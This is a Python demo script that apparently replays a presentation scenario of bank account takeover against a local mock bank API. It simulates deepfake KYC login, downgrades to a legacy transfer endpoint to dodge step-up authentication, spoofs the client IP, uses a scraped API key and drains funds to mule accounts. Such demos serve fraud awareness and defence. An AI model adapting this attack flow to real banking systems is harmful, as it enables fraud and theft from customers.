"""Replays the slide-9 scenario: valid biometrics, valid KYC, account drained at machine speed."""
import argparse
import sys
import time

import httpx

R, G, Y, C, D, B, X = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[2m", "\033[1m", "\033[0m"
MULES = [("Brightline Trading Ltd", "SC52BAHL01031234567890123456USD", "SC"),
         ("Kestrel Global FZE", "MU17BOMM0101101030300200000MUR", "MU"),
         ("Arslan Imports LLC", "GE29NB0000000101904917", "GE"),
         ("Nimbus OTC Desk (non-custodial)", "LT121000011101001000", "LT"),
         ("Brightline Trading Ltd", "SC52BAHL01031234567890123456USD", "SC"),
         ("Kestrel Global FZE", "MU17BOMM0101101030300200000MUR", "MU"),
         ("Nimbus OTC Desk (non-custodial)", "LT121000011101001000", "LT"),
         ("Arslan Imports LLC", "GE29NB0000000101904917", "GE"),
         ("Nimbus OTC Desk (non-custodial)", "LT121000011101001000", "LT")]
REFERENCE = {"LT": "USDT-TRC20 TQ9yD4mF7kP2xW8nR1vB6cJ3hL5sA0eZ"}


T0 = time.monotonic()


def say(msg: str, delay: float = 0.0):
    print(f"{D}[+{time.monotonic() - T0:6.2f}s]{X} {msg}", flush=True)
    time.sleep(delay)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bank", default="http://127.0.0.1:8000")
    ap.add_argument("--amount", type=float, default=50_000)
    ap.add_argument("--canary", action="store_true", help="use the API key scraped from the decompiled app")
    ap.add_argument("--pace", type=float, default=0.35)
    a = ap.parse_args()
    headers = {"User-Agent": "okhttp/4.9.3", "X-Forwarded-For": "185.220.101.47"}
    if a.canary:
        headers["X-Api-Key"] = "dsrt_live_7Hq2LmX9vB4kP0aZ"
    bank = httpx.Client(base_url=a.bank, headers=headers, timeout=30)

    print(f"\n{B}{R}  TARGET: Desert Bank · customer C-1001{X}\n")
    say(f"{D}injecting deepfake stream into video-KYC camera feed...{X}", 1.0)
    r = bank.post("/v2/auth/login", json={"customer_id": "C-1001", "device_id": "pixel8-emu-7f3a",
                                          "biometric_score": 0.998, "kyc_video_passed": True})
    r.raise_for_status()
    bank.headers["Authorization"] = f"Bearer {r.json()['token']}"
    say(f"{G}FaceID verified ✓   KYC passed ✓   session issued{X}", 0.6)
    acc = bank.get("/v2/accounts").json()["accounts"][0]
    say(f"account {acc['id']} · balance {B}AED {acc['balance']:,.2f}{X}", 0.8)

    first = MULES[0]
    body = {"from_account": acc["id"], "to_iban": first[1], "to_name": first[0], "country": first[2], "amount": a.amount}
    r = bank.post("/v2/transfers", json=body)
    if r.status_code == 403:
        say(f"{Y}/v2/transfers → 403 step_up_required. Trying the legacy API...{X}", 0.8)
    total = 0.0
    for name, iban, country in MULES:
        body = {"from_account": acc["id"], "to_iban": iban, "to_name": name, "country": country,
                "amount": a.amount, "reference": REFERENCE.get(country, "INV-2026-11")}
        r = bank.post("/v1/transfers", json=body)
        if r.status_code != 200:
            say(f"{R}{r.status_code} {r.text[:80]}{X}")
            break
        d = r.json()
        total += a.amount
        say(f"{G}APPROVED{X} AED {a.amount:,.0f} → {name[:28]:<28} {iban[:4]}… {D}{d['transfer_id']}{X}  "
            f"balance AED {d['balance_after']:,.2f}", a.pace)
    bal = bank.get(f"/v1/accounts/{acc['id']}/balance").json()["balance"]
    print(f"\n{B}{G}  DONE: AED {total:,.0f} moved out · balance left AED {bal:,.2f}{X}\n")


if __name__ == "__main__":
    sys.exit(main())
